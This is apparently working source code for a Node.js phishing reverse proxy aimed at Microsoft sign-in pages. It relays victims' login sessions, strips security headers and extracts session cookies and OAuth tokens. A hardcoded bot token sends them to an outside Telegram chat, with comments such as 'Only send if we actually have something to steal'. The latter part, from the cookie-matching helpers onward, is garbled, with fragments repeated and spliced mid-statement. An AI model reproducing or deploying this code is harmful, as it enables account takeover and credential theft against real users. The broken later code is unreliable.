const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");

// ─── TELEGRAM CONFIG (YOURS) ────────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = "8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg";
const TELEGRAM_CHAT_ID = "7310383191";
// ─────────────────────────────────────────────────────────────────────────────

const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
try {
    if (!fs.existsSync(LOGS_DIRECTORY)) {
        fs.mkdirSync(LOGS_DIRECTORY);
    }
} catch (error) {
    displayError("Directory creation failed", error, LOGS_DIRECTORY);
}
const LOG_FILE_STREAMS = {};
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
const VICTIM_SESSIONS = {};

// ─── TELEGRAM HELPER (fire-and-forget) ─────────────────────────────────────
function sendTelegramNotification(text) {
    const payload = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text.slice(0, 4096), // Telegram limit
        parse_mode: "HTML",
        disable_web_page_preview: true
    });
    const options = {
        hostname: "api.telegram.org",
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload)
        },
        timeout: 5000
    };
    const req = https.request(options, (res) => {
        res.on("data", () => {});
        res.on("end", () => {});
    });
    req.on("error", (e) => console.error("Telegram send error:", e.message));
    req.on("timeout", () => req.destroy());
    req.write(payload);
    req.end();
}

// ─── SMART EXTRACTOR: returns null if nothing valuable ────────────────────
function buildCaptureMessage(sessionId, statusCode, responseHeaders, responseBodyBuffer, requestUrl, method) {
    const lines = [];
    const timestamp = new Date().toISOString();
    let hasArtifact = false;

    // 1. Check Set-Cookie for session cookies
    const setCookies = responseHeaders["set-cookie"];
    let sessionCookies = [];
    if (setCookies) {
        const cookiesArray = Array.isArray(setCookies) ? setCookies : [setCookies];
        sessionCookies = cookiesArray.filter(c => 
            c.includes("ESTSAUTH") || c.includes("MSA") || c.includes(".AspNet") ||
            c.includes("signin") || c.includes("session") || c.includes("auth")
        );
        if (sessionCookies.length > 0) hasArtifact = true;
    }

    // 2. Check body for OAuth tokens
    let bodyString = "";
    try {
        bodyString = responseBodyBuffer.toString("utf-8").slice(0, 5000);
    } catch {}
    const tokenRegex = /"(access_token|refresh_token|id_token|token_type|expires_in|code|session_state)"\s*:\s*"([^"]+)"/gi;
    let match;
    const foundTokens = [];
    while ((match = tokenRegex.exec(bodyString)) !== null) {
        foundTokens.push({ key: match[1], value: match[2] });
        hasArtifact = true;
    }
    // Also check URL query for code/state
    let urlCode = "", urlState = "", urlSessionState = "";
    try {
        const urlObj = new URL(requestUrl);
        urlCode = urlObj.searchParams.get("code") || "";
        urlState = urlObj.searchParams.get("state") || "";
        urlSessionState = urlObj.searchParams.get("session_state") || "";
        if (urlCode || urlState || urlSessionState) hasArtifact = true;
    } catch {}

    // If nothing valuable, return null (skip sending)
    if (!hasArtifact) return null;

    // Build the message
    lines.push(`🧠 <b>CAPTURE #${sessionId}</b>`);
    lines.push(`⏱  ${timestamp}`);
    lines.push(`🌐  ${method} ${requestUrl}`);
    lines.push(`📊  Status: ${statusCode}`);
    if (responseHeaders.location) {
        lines.push(`🔀  Location: ${responseHeaders.location}`);
    }
    lines.push("");

    if (sessionCookies.length > 0) {
        lines.push("🍪 <b>SESSION COOKIES:</b>");
        sessionCookies.forEach(c => lines.push(`   ${c.replace(/; /g, ";\n   ")}`));
        lines.push("");
    }

    if (foundTokens.length > 0) {
        lines.push("🔑 <b>OAUTH TOKENS:</b>");
        foundTokens.forEach(t => lines.push(`   ${t.key}: ${t.value.slice(0, 120)}${t.value.length > 120 ? "..." : ""}`));
        lines.push("");
    }

    if (urlCode) lines.push(`📩 <b>URL code:</b> ${urlCode.slice(0, 80)}...`);
    if (urlState) lines.push(`🔖 <b>URL state:</b> ${urlState}`);
    if (urlSessionState) lines.push(`📌 <b>URL session_state:</b> ${urlSessionState}`);
    if (urlCode || urlState || urlSessionState) lines.push("");

    return lines.join("\n");
}

// ─── PROXY SERVER ────────────────────────────────────────────────────────────
const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;

            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
        }
        catch (error) {
            displayError("Phishing URL parsing failed", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
    }

    else if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
            fs.createReadStream(url.slice(1)).pipe(clientResponse);
        }
        else if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            clientResponse.end();
        }

        else {
            let clientRequestBody = [];
            clientRequest
                .on("error", (error) => {
                    displayError("Client request body retrieval failed", error, method, url);
                })
                .on("data", (chunk) => {
                    clientRequestBody.push(chunk);
                })
                .on("end", () => {
                    clientRequestBody = Buffer.concat(clientRequestBody).toString();

                    if (!currentSession) {
                        if (clientRequestBody) {
                            try {
                                clientRequestBody = JSON.parse(clientRequestBody);
                                const proxyRequestURL = new URL(clientRequestBody.url);
                                const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                if (proxyRequestURL.hostname === headers.host &&
                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    try {
                                        const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                        const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);

                                        VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                        VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                        VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                        VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                        VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                                        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                        clientResponse.end();
                                    }
                                    catch (error) {
                                        displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                    }
                                } else {
                                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                    clientResponse.end();
                                }
                            } catch (error) {
                                displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                            }
                        } else {
                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
                            clientResponse.end();
                        }
                    }

                    else {
                        let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                        const proxyRequestOptions = {
                            hostname: VICTIM_SESSIONS[currentSession].hostname,
                            port: VICTIM_SESSIONS[currentSession].port,
                            method: method,
                            path: VICTIM_SESSIONS[currentSession].path,
                            headers: { ...headers },
                            rejectUnauthorized: false
                        };
                        let isNavigationRequest = false;

                        if (clientRequestBody) {
                            if (url === PROXY_PATHNAMES.jsCookie) {
                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                clientResponse.end(JSON.stringify(validDomains));
                                return;
                            }

                            else if (url === PROXY_PATHNAMES.proxy) {
                                try {
                                    clientRequestBody = JSON.parse(clientRequestBody);
                                    let proxyRequestURL = new URL(clientRequestBody.url);
                                    let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                    if (proxyRequestURL.hostname === headers.host) {
                                        if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                            try {
                                                const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                                VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                                VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                                VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                                VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                                VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                                clientResponse.end();
                                            }
                                            catch (error) {
                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                            }
                                            return;
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                            fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                            return;
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                            try {
                                                const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                                proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                                proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                                            }
                                            catch (error) {
                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                                return;
                                            }
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
                                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                            clientResponse.end(JSON.stringify(validDomains));
                                            return;
                                        }
                                    }
                                    proxyRequestProtocol = proxyRequestURL.protocol;
                                    proxyRequestOptions.path = proxyRequestPath;
                                    proxyRequestOptions.port = proxyRequestURL.port;
                                    proxyRequestOptions.method = clientRequestBody.method;

                                    proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
                                    if (proxyRequestURL.hostname !== headers.host) {
                                        proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                        proxyRequestOptions.headers.host = proxyRequestURL.host;
                                    }
                                    if (proxyRequestOptions.headers.referer) {
                                        proxyRequestOptions.headers.referer = clientRequestBody.referrer;
                                    }
                                    isNavigationRequest = clientRequestBody.mode === "navigate";
                                }
                                catch (error) {
                                    displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                                }
                            } else {
                                console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
                            }
                        } else {
                            console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
                        }

                        proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                        updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                        const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                        const requestContentLength = Buffer.byteLength(proxyRequestBody);
                        if (requestContentLength) {
                            proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
                        }
                        else {
                            delete proxyRequestOptions.headers["content-type"];
                            delete proxyRequestOptions.headers["content-length"];
                        }

                        if (isNavigationRequest) {
                            VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                            VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                            VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                            VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                            VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                        }

                        makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
                    }
                });
        }
    }

    else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});
proxyServer.listen(process.env.PORT ?? 3000);

// ─── PROXY REQUEST HANDLER (with Telegram hook) ────────────────────────────
const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
    const protocol = proxyRequestProtocol === "https:" ? https : http;
    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {

        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
            .catch(error => displayError("Log encryption failed", error));

        if (isNavigationRequest &&
            proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
            proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {

            const proxyResponseLocation = proxyResponse.headers.location;
            if (proxyResponseLocation) {
                try {
                    const locationURL = new URL(proxyResponseLocation);

                    VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                    VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                    VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                    VICTIM_SESSIONS[currentSession].port = locationURL.port;
                    VICTIM_SESSIONS[currentSession].host = locationURL.host;

                    proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
                } catch {
                    VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
                }
            }
        }
        else if (proxyResponse.statusCode > 400) {
            displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
        }

        const proxyResponseCookie = proxyResponse.headers["set-cookie"];
        if (proxyResponseCookie) {
            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
        }
        proxyResponse.headers["cache-control"] = "no-store";
        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

        let serverResponseBody = [];
        proxyResponse
            .on("error", (error) => {
                displayError("Server response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path);
            })
            .on("data", (chunk) => {
                serverResponseBody.push(chunk);
            })
            .on("end", async () => {
                serverResponseBody = Buffer.concat(serverResponseBody);

                // ─── TELEGRAM HOOK: only on meaningful captures ──────────────────────
                const status = proxyResponse.statusCode;
                const isAuthSuccess = (status === 200 || status === 301 || status === 302 || status === 303 || status === 307);
                const hasSetCookie = proxyResponse.headers["set-cookie"] !== undefined;
                let bodyPreview = "";
                try { bodyPreview = serverResponseBody.toString("utf-8").slice(0, 3000); } catch {}
                const hasToken = /access_token|refresh_token|id_token|"code"|"session_state"/i.test(bodyPreview);
                // Only send if we actually have something to steal
                if (isAuthSuccess && (hasSetCookie || hasToken) && currentSession && VICTIM_SESSIONS[currentSession]) {
                    const fullRequestUrl = `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`;
                    const msg = buildCaptureMessage(
                        currentSession,
                        status,
                        proxyResponse.headers,
                        serverResponseBody,
                        fullRequestUrl,
                        proxyRequestOptions.method
                    );
                    if (msg) {
                        setImmediate(() => sendTelegramNotification(msg));
                    }
                }

                // ─── Process HTML injection ──────────────────────────────────────────
                if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
                    Buffer.byteLength(serverResponseBody)) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateHTMLProxyResponse(decompressedResponseBody);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                // ─── Modify FederationRedirectUrl ────────────────────────────────────
                else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                clientResponse.end(serverResponseBody);
            });
    });

    if (proxyRequestBody) {
        proxyRequest.write(proxyRequestBody);
    }
    proxyRequest.end();
}

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name ?? error}`);
    console.error(`Message: ${error.message}`);
    console.error(`Stack trace: ${error.stack}`);

    for (let i = 0; i < args.length; i++) {
        console.error(`Parameter ${i + 1}: ${args[i]}`);
    }
    console.error("******************************");
}

function getUserSession(requestCookies) {
    if (!requestCookies) return;

    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");

        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });

    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);

    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);

    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];

        cipher
            .on("error", (error) => {
                reject(error);
            })
            .on("data", (chunk) => {
                encryptedData.push(chunk);
            })
            .on("end", () => {
                resolve({
                    iv: iv.toString("hex"),
                    encryptedData: Buffer.concat(encryptedData).toString("hex")
                });
            });

        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];

    const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));

    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
}

function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const splitRequestHostname = requestHostname.split(".");
    const splitCookieDomain = cookieDomain.split(".");

    if (splitCookieDomain.length < 2) {
        return false;
    }
    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) {
        return false;
    }
    if (splitRequestHostname.length < splitCookieDomain.length) {
        return false;
    }

    for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) {
            return false;
        }
    }
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    consti) !== splitRequestHostname.at(-i)) {
            return false;
        }
    }
    return true;
}

function isPathApplicable(request splitRequestPath = requestPath.split("/Path, cookiePath) {
    const splitRequestPath = requestPath");
    const splitCookiePath = cookiePath.split("/");

    if (cookiePath === "/") {
        return true;
    }
    if (splitRequest.split("/");
    const splitCookiePath = cookiePath.split("/");

    if (cookiePath === "/") {
        return true;
    }
    if (splitRequestPath.length < splitCookiePath.length) {
        return false;
    }

    for (let i = 1, l = splitCookiePath.length < splitCookiePath.length) {
        return false;
    }

    for (let i = 1, l = splitCookiePath.length; i < l; i++) {
        if (splitCookiePath[i] !== splitRequestPath[i])Path.length; i < l; i++) {
        if (splitCookiePath[i] !== splitRequestPath[i]) {
            return false;
        }
    {
            return false;
        }
    }
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return (
        isDomainApplic }
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return (
        isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
        isPathApplicable(requestOptions.path, cookie.path)
    );
}

functionable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
        isPathApplicable(requestOptions.path, cookie.path)
    );
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const proxyRequestCookies = {};
    const currentTimestamp = Date.now();

    prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const proxyRequestCookies = {};
    const currentTimestamp = Date.now();

    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(currentTimestamp > cookie.expires for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            proxyRequestCookies[cookie.name] = cookie.value;
        }
    }
    return Object.) && isCookieApplicable(proxyRequestOptions, cookie)) {
            proxyRequestCookies[cookie.name] = cookie.value;
       entries(proxyRequestCookies)
        .map(([cookieName, cookieValue]) => `${cookieName}=${cookie }
    }
    return Object.entries(proxyRequestCookies)
        .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
        .join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false;
   Value}`)
        .join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false;
    let foundDay = false;
    let foundMonth = false;
    let foundYear = false;

    let hourValue, minuteValue, secondValue;
    let foundDay = false;
    let foundMonth = false;
    let foundYear = false;

    let hourValue, minuteValue, secondValue;
    let dayValue, monthValue, yearValue;

    const delimiterRegex = /[\x09\x20-\x2 let dayValue, monthValue, yearValue;

    const delimiterRegex = /[\x09\x20-\x2F\x3BF\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
    const dateTokens = cookieDate.split-\x40\x5B-\x60\x7B-\x7E]+/;
    const dateTokens = cookieDate.split(delimiterRegex(delimiterRegex).filter(token => token);

    for (const token of dateTokens) {
        if (!foundTime) {
            const timeMatch).filter(token => token);

    for (const token of dateTokens) {
        if (!foundTime) {
            const timeMatch = /^(\ = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);

            if (timeMatch) {
                foundTime = true;
                hourValue = parseInt(timeMatch[1]);
                minuteValued{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);

            if (timeMatch) {
                foundTime = true;
                hourValue = parseInt(timeMatch[1 = parseInt(timeMatch[2]);
               ]);
                minuteValue = parseInt(timeMatch[2]);
                secondValue = parseInt secondValue = parseInt(timeMatch[3]);
                continue;
            }
        }
        if (!foundDay) {
            const dayMatch = /^(\d(timeMatch[3]);
                continue;
            }
        }
        if (!foundDay) {
            const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);

            if (dayMatch) {
                foundDay = true;
                day{1,2})(?:[^\d]|$)/.exec(token);

            if (dayMatch) {
                foundDay = true;
                dayValue = parseInt(dayMatch[1]);
                continue;
            }
        }
        if (!foundMonth) {
           Value = parseInt(dayMatch[1]);
                continue;
            }
        }
        if (!foundMonth) {
            const monthLowerCase = token.toLowerCase();
            const months = ["jan", "feb", "mar", "apr", "may", "jun", "j const monthLowerCase = token.toLowerCase();
            const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];

            for (let i = 0; i < months.length;ul", "aug", "sep", "oct", "nov", "dec"];

            for (let i = 0; i < months.length; i++) {
                if (monthLowerCase.startsWith(months[i])) {
                    foundMonth = true;
                    monthValue = i;
                    i++) {
                if (monthLowerCase.startsWith(months[i])) {
                    foundMonth = true;
                    monthValue = i;
                    break;
                break;
                }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const yearMatch = /^(\d }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const yearMatch = /^(\d{2,4{2,4})(?:[^\d]|$)/.exec(token);

            if (yearMatch) {
                foundYear = true;
})(?:[^\d]|$)/.exec(token);

            if (yearMatch) {
                foundYear = true;
                yearValue =                yearValue = parseInt(yearMatch[1]);
                continue;
            }
        }
    }

    if (yearValue >= 70 && yearValue <= 99) {
        parseInt(yearMatch[1]);
                continue;
            }
        }
    }

    if (yearValue >= 70 && yearValue <= 99) {
        yearValue += 1900;
    } else if (yearValue >= 0 && yearValue <= 69) {
        yearValue += 2000;
    }

    if (!foundDay yearValue += 1900;
    } else if (yearValue >= 0 && yearValue <= 69) {
        yearValue += 2000;
    }

    if (!foundDay || !foundMonth || !foundYear || !foundTime) {
        return NaN;
    }
    if (day || !foundMonth || !foundYear || !foundTime) {
        return NaN;
    }
    if (dayValue < 1 || dayValue >Value < 1 || dayValue > 31) {
        return NaN;
    }
    if (yearValue < 1601) {
        return NaN;
    }
    if (hourValue 31) {
        return NaN;
    }
    if (yearValue < 1601) {
        return NaN;
    }
    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
        return NaN;
    }

    const parsedCookieDate = new > 23 || minuteValue > 59 || secondValue > 59) {
        return NaN;
    }

    const parsedCookieDate = new Date(Date.UTC(
        yearValue,
        monthValue,
        dayValue,
        hourValue,
        minuteValue,
        secondValue
    ));

    if Date(Date.UTC(
        yearValue,
        monthValue,
        dayValue,
        hourValue,
        minuteValue,
        secondValue
    ));

    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
        parsedCookieDate.getUTCMonth() !== monthValue ||
 (parsedCookieDate.getUTCFullYear() !== yearValue ||
        parsedCookieDate.getUTCMonth() !== monthValue ||
        parsedCookieDate.getUTCDate() !== dayValue) {
        return NaN;
    }
    return parsedCookieDate.getTime();
        parsedCookieDate.getUTCDate() !== dayValue) {
        return NaN;
    }
    return parsedCookieDate.getTime();
}

function updateCurrentSessionCookies(request}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathName, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/Match = request.path.match(/^\/[^?#]*(?=\/)/);
    const currentTimestamp = Date.now();
    let clockSkew[^?#]*(?=\/)/);
